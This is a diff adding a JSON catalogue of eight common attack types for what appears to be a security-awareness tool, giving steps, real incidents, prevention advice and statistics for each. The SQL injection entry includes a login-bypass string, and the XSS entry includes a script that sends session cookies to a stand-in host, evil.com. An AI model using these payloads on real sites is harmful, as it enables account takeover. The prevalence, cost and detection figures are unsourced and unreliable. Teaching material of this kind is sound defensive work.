@@ -1,0 +1,162 @@
+[
+  {
+    "id": "phishing",
+    "category": "Social Engineering",
+    "name": "Phishing",
+    "severity": "High",
+    "owasp": "A07:2021",
+    "icon": "🎣",
+    "short": "Deceptive emails impersonating trusted entities to steal credentials or install malware.",
+    "description": "Phishing is the most prevalent cyber attack vector, responsible for over 80% of reported security incidents. Attackers craft convincing emails mimicking banks, tech companies, or internal IT departments to trick users into revealing passwords, clicking malicious links, or downloading malware.",
+    "how_it_works": [
+      "Attacker registers a lookalike domain (paypa1.com vs paypal.com)",
+      "Crafts HTML email matching real brand design",
+      "Sends to thousands or targeted individuals",
+      "Victim clicks link → lands on fake login page",
+      "Credentials captured and sent to attacker"
+    ],
+    "real_examples": ["2016 DNC Hack — spear phishing email compromised John Podesta's Gmail", "2020 Twitter Bitcoin Scam — phishing internal staff to access admin tools"],
+    "prevention": ["Verify sender domain carefully", "Hover over links before clicking", "Enable MFA on all accounts", "Use email security gateways", "Report suspicious emails to IT"],
+    "stats": {"prevalence": "83%", "avg_cost": "$4.91M", "detection_rate": "3%"}
+  },
+  {
+    "id": "spearphishing",
+    "category": "Social Engineering",
+    "name": "Spear Phishing",
+    "severity": "Critical",
+    "owasp": "A07:2021",
+    "icon": "🎯",
+    "short": "Highly targeted phishing using personal information to appear legitimate.",
+    "description": "Unlike mass phishing, spear phishing targets specific individuals using researched personal details from LinkedIn, social media, or data breaches. A spear phishing email to a CFO might reference a real colleague, recent project, or internal system — making it extremely convincing.",
+    "how_it_works": [
+      "Attacker researches target on LinkedIn, company website, social media",
+      "Collects names of colleagues, managers, project names",
+      "Crafts highly personalized email with real context",
+      "Target trusts email due to specific details",
+      "Malicious payload delivered"
+    ],
+    "real_examples": ["2014 Sony Pictures Hack — spear phishing led to massive data breach", "Operation Aurora (Google, 2010) — targeted engineers via personal email"],
+    "prevention": ["Verify unexpected requests via phone/in-person", "Be skeptical of emails referencing personal details", "Never wire money based solely on email", "Train executives on whaling attacks"],
+    "stats": {"prevalence": "65%", "avg_cost": "$1.8M", "detection_rate": "8%"}
+  },
+  {
+    "id": "ransomware",
+    "category": "Malware",
+    "name": "Ransomware",
+    "severity": "Critical",
+    "owasp": "A08:2021",
+    "icon": "🔒",
+    "short": "Malware that encrypts victim data and demands cryptocurrency payment for decryption.",
+    "description": "Ransomware encrypts files on infected systems, rendering them inaccessible. Attackers demand payment — usually in Bitcoin — for the decryption key. Modern ransomware also exfiltrates data before encryption for double extortion: pay or we publish your data.",
+    "how_it_works": [
+      "Delivered via phishing email attachment or malicious download",
+      "Executes and scans for valuable files",
+      "Encrypts files using asymmetric encryption",
+      "Displays ransom note with payment instructions",
+      "Attacker may or may not provide decryption key after payment"
+    ],
+    "real_examples": ["WannaCry (2017) — infected 200,000+ systems in 150 countries", "Colonial Pipeline (2021) — $4.4M ransom, US fuel supply disrupted"],
+    "prevention": ["Regular offline backups (3-2-1 rule)", "Keep systems patched", "Disable macros in Office documents", "Network segmentation", "Endpoint detection and response (EDR)"],
+    "stats": {"prevalence": "71%", "avg_cost": "$4.54M", "detection_rate": "12%"}
+  },
+  {
+    "id": "mitm",
+    "category": "Network Attacks",
+    "name": "Man-in-the-Middle",
+    "severity": "High",
+    "owasp": "A02:2021",
+    "icon": "👤",
+    "short": "Intercepting communication between two parties to eavesdrop or alter data.",
+    "description": "In a MitM attack, an attacker positions themselves between the victim and a legitimate service. They can read, modify, or inject data into the communication stream. Common on public WiFi where attackers use ARP poisoning or rogue access points.",
+    "how_it_works": [
+      "Attacker sets up rogue WiFi hotspot or uses ARP poisoning",
+      "Victim connects, routing traffic through attacker",
+      "Attacker intercepts HTTP traffic in plaintext",
+      "SSL stripping downgrades HTTPS to HTTP",
+      "Credentials, session tokens captured"
+    ],
+    "real_examples": ["2011 DigiNotar CA Compromise — enabled MitM attacks on 300,000 Iranian Gmail users", "Superfish (2015) — Lenovo pre-installed adware enabling MitM on HTTPS"],
+    "prevention": ["Only use HTTPS sites (padlock icon)", "Avoid public WiFi for sensitive tasks", "Use a VPN", "Enable HSTS in browsers", "Verify certificates manually for critical systems"],
+    "stats": {"prevalence": "35%", "avg_cost": "$3.7M", "detection_rate": "18%"}
+  },
+  {
+    "id": "sqli",
+    "category": "Web Attacks",
+    "name": "SQL Injection",
+    "severity": "Critical",
+    "owasp": "A03:2021",
+    "icon": "💉",
+    "short": "Injecting malicious SQL code into input fields to manipulate or dump databases.",
+    "description": "SQL injection occurs when user input is directly concatenated into SQL queries without sanitization. Attackers can bypass login, dump entire databases, modify records, or execute commands on the server. Despite being well-known, SQLi remains in OWASP Top 3.",
+    "how_it_works": [
+      "Attacker finds input field that queries a database",
+      "Inputs SQL syntax: ' OR '1'='1' --",
+      "Application concatenates input directly into query",
+      "Modified query returns unintended data or bypasses auth",
+      "Advanced: UNION attacks dump entire tables"
+    ],
+    "real_examples": ["Heartland Payment Systems (2008) — 130M credit cards stolen via SQLi", "7-Eleven Japan (2019) — ¥500M stolen via SQLi in mobile app"],
+    "prevention": ["Use parameterized queries / prepared statements", "Input validation and sanitization", "Least privilege database accounts", "Web Application Firewall (WAF)", "Regular penetration testing"],
+    "stats": {"prevalence": "44%", "avg_cost": "$1.9M", "detection_rate": "22%"}
+  },
+  {
+    "id": "credential_stuffing",
+    "category": "Authentication Attacks",
+    "name": "Credential Stuffing",
+    "severity": "High",
+    "owasp": "A07:2021",
+    "icon": "🔑",
+    "short": "Using leaked username/password pairs from one breach to attack other services.",
+    "description": "Billions of credential pairs from past breaches are freely available on dark web markets. Attackers automate login attempts across hundreds of services, exploiting password reuse. If you use the same password on Netflix and your bank, one breach means both are compromised.",
+    "how_it_works": [
+      "Attacker obtains leaked credential database (e.g., from dark web)",
+      "Uses automated tools (Sentry MBA, OpenBullet)",
+      "Tests credentials against target login pages at scale",
+      "Successful logins = compromised accounts",
+      "Accounts sold, used for fraud, or held for ransom"
+    ],
+    "real_examples": ["Spotify (2020) — 350,000 accounts compromised via credential stuffing", "Zoom (2020) — 500,000 accounts sold on dark web"],
+    "prevention": ["Use unique passwords for every site", "Use a password manager", "Enable Multi-Factor Authentication", "Monitor haveibeenpwned.com", "Implement rate limiting and CAPTCHA"],
+    "stats": {"prevalence": "61%", "avg_cost": "$6.0M", "detection_rate": "28%"}
+  },
+  {
+    "id": "xss",
+    "category": "Web Attacks",
+    "name": "Cross-Site Scripting (XSS)",
+    "severity": "High",
+    "owasp": "A03:2021",
+    "icon": "⚡",
+    "short": "Injecting malicious scripts into web pages viewed by other users.",
+    "description": "XSS allows attackers to inject client-side scripts into web pages. When other users visit the page, the malicious script executes in their browser — stealing session cookies, redirecting to phishing pages, or performing actions on their behalf.",
+    "how_it_works": [
+      "Attacker finds input that renders unsanitized HTML",
+      "Injects: <script>document.location='evil.com?c='+document.cookie</script>",
+      "Script stored in database (Stored XSS) or in URL (Reflected XSS)",
+      "Victim visits page → script executes in their browser",
+      "Session token sent to attacker → account takeover"
+    ],
+    "real_examples": ["Samy Worm (2005) — MySpace XSS infected 1M profiles in 20 hours", "British Airways (2018) — XSS used to skim payment card data of 380,000 customers"],
+    "prevention": ["Encode output before rendering", "Content Security Policy (CSP) headers", "HttpOnly cookie flags", "Input validation", "Use modern frameworks (React, Angular) that auto-escape"],
+    "stats": {"prevalence": "53%", "avg_cost": "$2.5M", "detection_rate": "31%"}
+  },
+  {
+    "id": "social_engineering",
+    "category": "Social Engineering",
+    "name": "Vishing & Smishing",
+    "severity": "Medium",
+    "owasp": "A07:2021",
+    "icon": "📱",
+    "short": "Voice calls (vishing) and SMS messages (smishing) used to trick victims into revealing data.",
+    "description": "Voice phishing (vishing) involves attackers calling victims while impersonating banks, government agencies, or tech support. SMS phishing (smishing) uses text messages with malicious links. Both exploit the immediacy and trust associated with direct communication.",
+    "how_it_works": [
+      "Attacker spoofs caller ID to show legitimate bank number",
+      "Claims suspicious activity on your account",
+      "Pressures victim to 'verify' account details",
+      "Captures card numbers, OTP codes, passwords",
+      "Or: SMS with fake delivery link to steal credentials"
+    ],
+    "real_examples": ["IRS Vishing Scam — billions lost annually by US taxpayers", "FluBot (2021) — smishing campaign spreading Android malware via fake delivery SMS"],
+    "prevention": ["Never give credentials over the phone — hang up and call back official number", "Register for Do Not Call lists", "Be suspicious of any unsolicited contact", "Banks never ask for full passwords by phone"],
+    "stats": {"prevalence": "42%", "avg_cost": "$1.1M", "detection_rate": "15%"}
+  }
+]
